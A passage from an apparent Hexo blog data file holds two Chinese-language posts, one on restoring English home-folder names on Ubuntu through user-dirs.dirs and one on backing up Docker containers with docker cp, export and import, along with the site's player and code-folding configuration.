shell-escaped\n# homedir-relative path, or XDG_xxx_DIR=\"/yyy\", where /yyy is an\n# absolute path. No other format is supported.\n# \nXDG_DESKTOP_DIR=\"$HOME/桌面\"\nXDG_DOWNLOAD_DIR=\"$HOME/下载\"\nXDG_TEMPLATES_DIR=\"$HOME/模板\"\nXDG_PUBLICSHARE_DIR=\"$HOME/公共\"\nXDG_DOCUMENTS_DIR=\"$HOME/文档\"\nXDG_MUSIC_DIR=\"$HOME/音乐\"\nXDG_PICTURES_DIR=\"$HOME/图片\"\nXDG_VIDEOS_DIR=\"$HOME/视频\"\n```\n\n3. 上面是我修改完之前的样子，在修改之后是这样的：\n\n```bash 折叠代码\n# This file is written by xdg-user-dirs-update\n# If you want to change or add directories, just edit the line you're\n# interested in. All local changes will be retained on the next run.\n# Format is XDG_xxx_DIR=\"$HOME/yyy\", where yyy is a shell-escaped\n# homedir-relative path, or XDG_xxx_DIR=\"/yyy\", where /yyy is an\n# absolute path. No other format is supported.\n# \nXDG_DESKTOP_DIR=\"$HOME/Desktop\"\nXDG_DOWNLOAD_DIR=\"$HOME/Downloads\"\nXDG_TEMPLATES_DIR=\"$HOME/Template\"\nXDG_PUBLICSHARE_DIR=\"$HOME/Public\"\nXDG_DOCUMENTS_DIR=\"$HOME/Document\"\nXDG_MUSIC_DIR=\"$HOME/Music\"\nXDG_PICTURES_DIR=\"$HOME/Picture\"\nXDG_VIDEOS_DIR=\"$HOME/Viedo\"\n```\n\n4. 修改完这个配置文件，然后把家目录的对应文件夹的名字修改为与配置文件一致就OK了！\n\n```bash\nknight@knight:~/.ssh$ cd ~\nknight@knight:~$ ls\naliyun  Desktop   Downloads  nustarain          Public    snap      Viedo\nchrome  dingtalk  Music      package-lock.json  qq        sougou    vs_code\nclash   Document  node       Picture            qq_music  Template  wechat\n```\n\n5. 关机，重启，就会发现桌面的家目录文件夹全都消失了。","slug":"DelDesktopFolder","published":1,"updated":"2024-05-03T03:55:54.725Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5de00127zj3du7c9iev","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h3 id=\"问题描述\"><a href=\"#问题描述\" class=\"headerlink\" title=\"问题描述\"></a>问题描述</h3><p>由于中文版Ubuntu的系统在个人家目录会显示中文的文件夹（桌面，文档，照片等这些），因为在进入这些目录时需要先修改输入法语言，在使用了一段时间的Ubuntu后，感到实在费劲，所以索性将这些文件夹都改成了对应的英文名字，比如桌面对应“Desktop”，后来导致Ubuntu开机之后，家目录下的文件夹全部都显示到了桌面，真的是丑到极点。</p>\n<p>后来经过一番的查找资料，终于找到了解决办法。</p>\n<h3 id=\"解决办法\"><a href=\"#解决办法\" class=\"headerlink\" title=\"解决办法\"></a>解决办法</h3><ol>\n<li>在Ubuntu系统中有一个文件夹管理着家目录的文件夹名字和家目录某种程度上的系统变量的关系。在这个文件夹中记录着系统变量和家目录的对应关系。</li>\n</ol>\n<span id=\"more\"></span>\n\n<ol start=\"2\">\n<li>可以直接查看这个文件<code>cat ~/.config/user-dirs.dirs</code></li>\n</ol>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># This file is written by xdg-user-dirs-update</span></span><br><span class=\"line\"><span class=\"comment\"># If you want to change or add directories, just edit the line you&#x27;re</span></span><br><span class=\"line\"><span class=\"comment\"># interested in. All local changes will be retained on the next run.</span></span><br><span class=\"line\"><span class=\"comment\"># Format is XDG_xxx_DIR=&quot;$HOME/yyy&quot;, where yyy is a shell-escaped</span></span><br><span class=\"line\"><span class=\"comment\"># homedir-relative path, or XDG_xxx_DIR=&quot;/yyy&quot;, where /yyy is an</span></span><br><span class=\"line\"><span class=\"comment\"># absolute path. No other format is supported.</span></span><br><span class=\"line\"><span class=\"comment\"># </span></span><br><span class=\"line\">XDG_DESKTOP_DIR=<span class=\"string\">&quot;<span class=\"variable\">$HOME</span>/桌面&quot;</span></span><br><span class=\"line\">XDG_DOWNLOAD_DIR=<span class=\"string\">&quot;<span class=\"variable\">$HOME</span>/下载&quot;</span></span><br><span class=\"line\">XDG_TEMPLATES_DIR=<span class=\"string\">&quot;<span class=\"variable\">$HOME</span>/模板&quot;</span></span><br><span class=\"line\">XDG_PUBLICSHARE_DIR=<span class=\"string\">&quot;<span class=\"variable\">$HOME</span>/公共&quot;</span></span><br><span class=\"line\">XDG_DOCUMENTS_DIR=<span class=\"string\">&quot;<span class=\"variable\">$HOME</span>/文档&quot;</span></span><br><span class=\"line\">XDG_MUSIC_DIR=<span class=\"string\">&quot;<span class=\"variable\">$HOME</span>/音乐&quot;</span></span><br><span class=\"line\">XDG_PICTURES_DIR=<span class=\"string\">&quot;<span class=\"variable\">$HOME</span>/图片&quot;</span></span><br><span class=\"line\">XDG_VIDEOS_DIR=<span class=\"string\">&quot;<span class=\"variable\">$HOME</span>/视频&quot;</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>上面是我修改完之前的样子，在修改之后是这样的：</li>\n</ol>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># This file is written by xdg-user-dirs-update</span></span><br><span class=\"line\"><span class=\"comment\"># If you want to change or add directories, just edit the line you&#x27;re</span></span><br><span class=\"line\"><span class=\"comment\"># interested in. All local changes will be retained on the next run.</span></span><br><span class=\"line\"><span class=\"comment\"># Format is XDG_xxx_DIR=&quot;$HOME/yyy&quot;, where yyy is a shell-escaped</span></span><br><span class=\"line\"><span class=\"comment\"># homedir-relative path, or XDG_xxx_DIR=&quot;/yyy&quot;, where /yyy is an</span></span><br><span class=\"line\"><span class=\"comment\"># absolute path. No other format is supported.</span></span><br><span class=\"line\"><span class=\"comment\"># </span></span><br><span class=\"line\">XDG_DESKTOP_DIR=<span class=\"string\">&quot;<span class=\"variable\">$HOME</span>/Desktop&quot;</span></span><br><span class=\"line\">XDG_DOWNLOAD_DIR=<span class=\"string\">&quot;<span class=\"variable\">$HOME</span>/Downloads&quot;</span></span><br><span class=\"line\">XDG_TEMPLATES_DIR=<span class=\"string\">&quot;<span class=\"variable\">$HOME</span>/Template&quot;</span></span><br><span class=\"line\">XDG_PUBLICSHARE_DIR=<span class=\"string\">&quot;<span class=\"variable\">$HOME</span>/Public&quot;</span></span><br><span class=\"line\">XDG_DOCUMENTS_DIR=<span class=\"string\">&quot;<span class=\"variable\">$HOME</span>/Document&quot;</span></span><br><span class=\"line\">XDG_MUSIC_DIR=<span class=\"string\">&quot;<span class=\"variable\">$HOME</span>/Music&quot;</span></span><br><span class=\"line\">XDG_PICTURES_DIR=<span class=\"string\">&quot;<span class=\"variable\">$HOME</span>/Picture&quot;</span></span><br><span class=\"line\">XDG_VIDEOS_DIR=<span class=\"string\">&quot;<span class=\"variable\">$HOME</span>/Viedo&quot;</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>修改完这个配置文件，然后把家目录的对应文件夹的名字修改为与配置文件一致就OK了！</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">knight@knight:~/.ssh$ <span class=\"built_in\">cd</span> ~</span><br><span class=\"line\">knight@knight:~$ <span class=\"built_in\">ls</span></span><br><span class=\"line\">aliyun  Desktop   Downloads  nustarain          Public    snap      Viedo</span><br><span class=\"line\">chrome  dingtalk  Music      package-lock.json  qq        sougou    vs_code</span><br><span class=\"line\">clash   Document  node       Picture            qq_music  Template  wechat</span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li>关机，重启，就会发现桌面的家目录文件夹全都消失了。</li>\n</ol>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<h3 id=\"问题描述\"><a href=\"#问题描述\" class=\"headerlink\" title=\"问题描述\"></a>问题描述</h3><p>由于中文版Ubuntu的系统在个人家目录会显示中文的文件夹（桌面，文档，照片等这些），因为在进入这些目录时需要先修改输入法语言，在使用了一段时间的Ubuntu后，感到实在费劲，所以索性将这些文件夹都改成了对应的英文名字，比如桌面对应“Desktop”，后来导致Ubuntu开机之后，家目录下的文件夹全部都显示到了桌面，真的是丑到极点。</p>\n<p>后来经过一番的查找资料，终于找到了解决办法。</p>\n<h3 id=\"解决办法\"><a href=\"#解决办法\" class=\"headerlink\" title=\"解决办法\"></a>解决办法</h3><ol>\n<li>在Ubuntu系统中有一个文件夹管理着家目录的文件夹名字和家目录某种程度上的系统变量的关系。在这个文件夹中记录着系统变量和家目录的对应关系。</li>\n</ol>","more":"<ol start=\"2\">\n<li>可以直接查看这个文件<code>cat ~/.config/user-dirs.dirs</code></li>\n</ol>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># This file is written by xdg-user-dirs-update</span></span><br><span class=\"line\"><span class=\"comment\"># If you want to change or add directories, just edit the line you&#x27;re</span></span><br><span class=\"line\"><span class=\"comment\"># interested in. All local changes will be retained on the next run.</span></span><br><span class=\"line\"><span class=\"comment\"># Format is XDG_xxx_DIR=&quot;$HOME/yyy&quot;, where yyy is a shell-escaped</span></span><br><span class=\"line\"><span class=\"comment\"># homedir-relative path, or XDG_xxx_DIR=&quot;/yyy&quot;, where /yyy is an</span></span><br><span class=\"line\"><span class=\"comment\"># absolute path. No other format is supported.</span></span><br><span class=\"line\"><span class=\"comment\"># </span></span><br><span class=\"line\">XDG_DESKTOP_DIR=<span class=\"string\">&quot;<span class=\"variable\">$HOME</span>/桌面&quot;</span></span><br><span class=\"line\">XDG_DOWNLOAD_DIR=<span class=\"string\">&quot;<span class=\"variable\">$HOME</span>/下载&quot;</span></span><br><span class=\"line\">XDG_TEMPLATES_DIR=<span class=\"string\">&quot;<span class=\"variable\">$HOME</span>/模板&quot;</span></span><br><span class=\"line\">XDG_PUBLICSHARE_DIR=<span class=\"string\">&quot;<span class=\"variable\">$HOME</span>/公共&quot;</span></span><br><span class=\"line\">XDG_DOCUMENTS_DIR=<span class=\"string\">&quot;<span class=\"variable\">$HOME</span>/文档&quot;</span></span><br><span class=\"line\">XDG_MUSIC_DIR=<span class=\"string\">&quot;<span class=\"variable\">$HOME</span>/音乐&quot;</span></span><br><span class=\"line\">XDG_PICTURES_DIR=<span class=\"string\">&quot;<span class=\"variable\">$HOME</span>/图片&quot;</span></span><br><span class=\"line\">XDG_VIDEOS_DIR=<span class=\"string\">&quot;<span class=\"variable\">$HOME</span>/视频&quot;</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>上面是我修改完之前的样子，在修改之后是这样的：</li>\n</ol>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># This file is written by xdg-user-dirs-update</span></span><br><span class=\"line\"><span class=\"comment\"># If you want to change or add directories, just edit the line you&#x27;re</span></span><br><span class=\"line\"><span class=\"comment\"># interested in. All local changes will be retained on the next run.</span></span><br><span class=\"line\"><span class=\"comment\"># Format is XDG_xxx_DIR=&quot;$HOME/yyy&quot;, where yyy is a shell-escaped</span></span><br><span class=\"line\"><span class=\"comment\"># homedir-relative path, or XDG_xxx_DIR=&quot;/yyy&quot;, where /yyy is an</span></span><br><span class=\"line\"><span class=\"comment\"># absolute path. No other format is supported.</span></span><br><span class=\"line\"><span class=\"comment\"># </span></span><br><span class=\"line\">XDG_DESKTOP_DIR=<span class=\"string\">&quot;<span class=\"variable\">$HOME</span>/Desktop&quot;</span></span><br><span class=\"line\">XDG_DOWNLOAD_DIR=<span class=\"string\">&quot;<span class=\"variable\">$HOME</span>/Downloads&quot;</span></span><br><span class=\"line\">XDG_TEMPLATES_DIR=<span class=\"string\">&quot;<span class=\"variable\">$HOME</span>/Template&quot;</span></span><br><span class=\"line\">XDG_PUBLICSHARE_DIR=<span class=\"string\">&quot;<span class=\"variable\">$HOME</span>/Public&quot;</span></span><br><span class=\"line\">XDG_DOCUMENTS_DIR=<span class=\"string\">&quot;<span class=\"variable\">$HOME</span>/Document&quot;</span></span><br><span class=\"line\">XDG_MUSIC_DIR=<span class=\"string\">&quot;<span class=\"variable\">$HOME</span>/Music&quot;</span></span><br><span class=\"line\">XDG_PICTURES_DIR=<span class=\"string\">&quot;<span class=\"variable\">$HOME</span>/Picture&quot;</span></span><br><span class=\"line\">XDG_VIDEOS_DIR=<span class=\"string\">&quot;<span class=\"variable\">$HOME</span>/Viedo&quot;</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>修改完这个配置文件，然后把家目录的对应文件夹的名字修改为与配置文件一致就OK了！</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">knight@knight:~/.ssh$ <span class=\"built_in\">cd</span> ~</span><br><span class=\"line\">knight@knight:~$ <span class=\"built_in\">ls</span></span><br><span class=\"line\">aliyun  Desktop   Downloads  nustarain          Public    snap      Viedo</span><br><span class=\"line\">chrome  dingtalk  Music      package-lock.json  qq        sougou    vs_code</span><br><span class=\"line\">clash   Document  node       Picture            qq_music  Template  wechat</span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li>关机，重启，就会发现桌面的家目录文件夹全都消失了。</li>\n</ol>"},{"title":"Docker重要数据备份","date":"2023-08-08T07:02:50.000Z","_content":"\n生产环境中，免不了会出现一些误操作，导致Docker开发重要文件或者数据的丢失，那么做好重要数据的备份是免不了的。主要就是重要的配置文件，甚至已经生成的重要的容器，后者更简单粗暴。\n\n### 拷贝容器的配置文件\n\n```bash\ndocker cp 容器ID:/tmp/a.txt /home/admin\n```\n\n例子：\n\n<!-- more -->\n\n将nginx-1容器的NGINX配置文件拷贝到当前目录下\n\n```bash\nroot@knight:/docker/nginx# ls\nroot@knight:/docker/nginx# docker ps\nCONTAINER ID   IMAGE          COMMAND                  CREATED          STATUS          PORTS     NAMES\nc2dbddec15d3   mynginx:0.1    \"/bin/bash\"              44 minutes ago   Up 25 minutes             nginx-1\nroot@knight:/docker/nginx# docker cp nginx-1:/etc/nginx/nginx.conf ./\nroot@knight:/docker/nginx# ls\nnginx.conf\nroot@knight:/docker/nginx# \n```\n\n### 容器的导入与导出\n\n导出容器（默认是导出到当前目录下）：\n\n```bash\ndocker export 容器ID > xxx.tar\n```\n\n例子：\n\n```bash\nroot@knight:/docker# ls\nroot@knight:/docker# docker ps\nCONTAINER ID   IMAGE          COMMAND                  CREATED          STATUS          PORTS     NAMES\nc2dbddec15d3   mynginx:0.1    \"/bin/bash\"              51 minutes ago   Up 31 minutes             nginx-1\nroot@knight:/docker# docker export nginx-1 > nginx-1.tar\nroot@knight:/docker# ls\nnginx-1.tar\nroot@knight:/docker# \n```\n\n导入容器：\n\n```bash\ncat xxx.tar | docker import - [用户名/]镜像名:版本号\n```\n\n例子：\n\n导入nginx-1.tar这个容器\n\n```bash\nroot@knight:/docker# ls\nnginx-1.tar\nroot@knight:/docker# docker images\nREPOSITORY    TAG       IMAGE ID       CREATED         SIZE\nroot@knight:/docker# cat nginx-1.tar | docker import - knight/nginx-1:0.1\nsha256:f82cc108516521700a6d74e03e26be639131a5d361c66b50f923ba00a1df8fe3\nroot@knight:/docker# docker images\nREPOSITORY       TAG       IMAGE ID       CREATED         SIZE\nknight/nginx-1   0.1       f82cc1085165   4 seconds ago   140MB\nroot@knight:/docker# \n```","source":"_posts/DockerBackup.md","raw":"---\ntitle: Docker重要数据备份\ndate: 2023-08-08 15:02:50\ncategories: 学习过程\ntags:\n  - Docker\n---\n\n生产环境中，免不了会出现一些误操作，导致Docker开发重要文件或者数据的丢失，那么做好重要数据的备份是免不了的。主要就是重要的配置文件，甚至已经生成的重要的容器，后者更简单粗暴。\n\n### 拷贝容器的配置文件\n\n```bash\ndocker cp 容器ID:/tmp/a.txt /home/admin\n```\n\n例子：\n\n<!-- more -->\n\n将nginx-1容器的NGINX配置文件拷贝到当前目录下\n\n```bash\nroot@knight:/docker/nginx# ls\nroot@knight:/docker/nginx# docker ps\nCONTAINER ID   IMAGE          COMMAND                  CREATED          STATUS          PORTS     NAMES\nc2dbddec15d3   mynginx:0.1    \"/bin/bash\"              44 minutes ago   Up 25 minutes             nginx-1\nroot@knight:/docker/nginx# docker cp nginx-1:/etc/nginx/nginx.conf ./\nroot@knight:/docker/nginx# ls\nnginx.conf\nroot@knight:/docker/nginx# \n```\n\n### 容器的导入与导出\n\n导出容器（默认是导出到当前目录下）：\n\n```bash\ndocker export 容器ID > xxx.tar\n```\n\n例子：\n\n```bash\nroot@knight:/docker# ls\nroot@knight:/docker# docker ps\nCONTAINER ID   IMAGE          COMMAND                  CREATED          STATUS          PORTS     NAMES\nc2dbddec15d3   mynginx:0.1    \"/bin/bash\"              51 minutes ago   Up 31 minutes             nginx-1\nroot@knight:/docker# docker export nginx-1 > nginx-1.tar\nroot@knight:/docker# ls\nnginx-1.tar\nroot@knight:/docker# \n```\n\n导入容器：\n\n```bash\ncat xxx.tar | docker import - [用户名/]镜像名:版本号\n```\n\n例子：\n\n导入nginx-1.tar这个容器\n\n```bash\nroot@knight:/docker# ls\nnginx-1.tar\nroot@knight:/docker# docker images\nREPOSITORY    TAG       IMAGE ID       CREATED         SIZE\nroot@knight:/docker# cat nginx-1.tar | docker import - knight/nginx-1:0.1\nsha256:f82cc108516521700a6d74e03e26be639131a5d361c66b50f923ba00a1df8fe3\nroot@knight:/docker# docker images\nREPOSITORY       TAG       IMAGE ID       CREATED         SIZE\nknight/nginx-1   0.1       f82cc1085165   4 seconds ago   140MB\nroot@knight:/docker# \n```","slug":"DockerBackup","published":1,"updated":"2024-05-03T03:55:54.725Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5df00157zj31c019ag6","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>生产环境中，免不了会出现一些误操作，导致Docker开发重要文件或者数据的丢失，那么做好重要数据的备份是免不了的。主要就是重要的配置文件，甚至已经生成的重要的容器，后者更简单粗暴。</p>\n<h3 id=\"拷贝容器的配置文件\"><a href=\"#拷贝容器的配置文件\" class=\"headerlink\" title=\"拷贝容器的配置文件\"></a>拷贝容器的配置文件</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker <span class=\"built_in\">cp</span> 容器ID:/tmp/a.txt /home/admin</span><br></pre></td></tr></table></figure>\n\n<p>例子：</p>\n<span id=\"more\"></span>\n\n<p>将nginx-1容器的NGINX配置文件拷贝到当前目录下</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@knight:/docker/nginx<span class=\"comment\"># ls</span></span><br><span class=\"line\">root@knight:/docker/nginx<span class=\"comment\"># docker ps</span></span><br><span class=\"line\">CONTAINER ID   IMAGE          COMMAND                  CREATED          STATUS          PORTS     NAMES</span><br><span class=\"line\">c2dbddec15d3   mynginx:0.1    <span class=\"string\">&quot;/bin/bash&quot;</span>              44 minutes ago   Up 25 minutes             nginx-1</span><br><span class=\"line\">root@knight:/docker/nginx<span class=\"comment\"># docker cp nginx-1:/etc/nginx/nginx.conf ./</span></span><br><span class=\"line\">root@knight:/docker/nginx<span class=\"comment\"># ls</span></span><br><span class=\"line\">nginx.conf</span><br><span class=\"line\">root@knight:/docker/nginx<span class=\"comment\"># </span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"容器的导入与导出\"><a href=\"#容器的导入与导出\" class=\"headerlink\" title=\"容器的导入与导出\"></a>容器的导入与导出</h3><p>导出容器（默认是导出到当前目录下）：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker <span class=\"built_in\">export</span> 容器ID &gt; xxx.tar</span><br></pre></td></tr></table></figure>\n\n<p>例子：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@knight:/docker<span class=\"comment\"># ls</span></span><br><span class=\"line\">root@knight:/docker<span class=\"comment\"># docker ps</span></span><br><span class=\"line\">CONTAINER ID   IMAGE          COMMAND                  CREATED          STATUS          PORTS     NAMES</span><br><span class=\"line\">c2dbddec15d3   mynginx:0.1    <span class=\"string\">&quot;/bin/bash&quot;</span>              51 minutes ago   Up 31 minutes             nginx-1</span><br><span class=\"line\">root@knight:/docker<span class=\"comment\"># docker export nginx-1 &gt; nginx-1.tar</span></span><br><span class=\"line\">root@knight:/docker<span class=\"comment\"># ls</span></span><br><span class=\"line\">nginx-1.tar</span><br><span class=\"line\">root@knight:/docker<span class=\"comment\"># </span></span><br></pre></td></tr></table></figure>\n\n<p>导入容器：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cat</span> xxx.tar | docker import - [用户名/]镜像名:版本号</span><br></pre></td></tr></table></figure>\n\n<p>例子：</p>\n<p>导入nginx-1.tar这个容器</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@knight:/docker<span class=\"comment\"># ls</span></span><br><span class=\"line\">nginx-1.tar</span><br><span class=\"line\">root@knight:/docker<span class=\"comment\"># docker images</span></span><br><span class=\"line\">REPOSITORY    TAG       IMAGE ID       CREATED         SIZE</span><br><span class=\"line\">root@knight:/docker<span class=\"comment\"># cat nginx-1.tar | docker import - knight/nginx-1:0.1</span></span><br><span class=\"line\">sha256:f82cc108516521700a6d74e03e26be639131a5d361c66b50f923ba00a1df8fe3</span><br><span class=\"line\">root@knight:/docker<span class=\"comment\"># docker images</span></span><br><span class=\"line\">REPOSITORY       TAG       IMAGE ID       CREATED         SIZE</span><br><span class=\"line\">knight/nginx-1   0.1       f82cc1085165   4 seconds ago   140MB</span><br><span class=\"line\">root@knight:/docker<span class=\"comment\"># </span></span><br></pre></td></tr></table></figure>","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    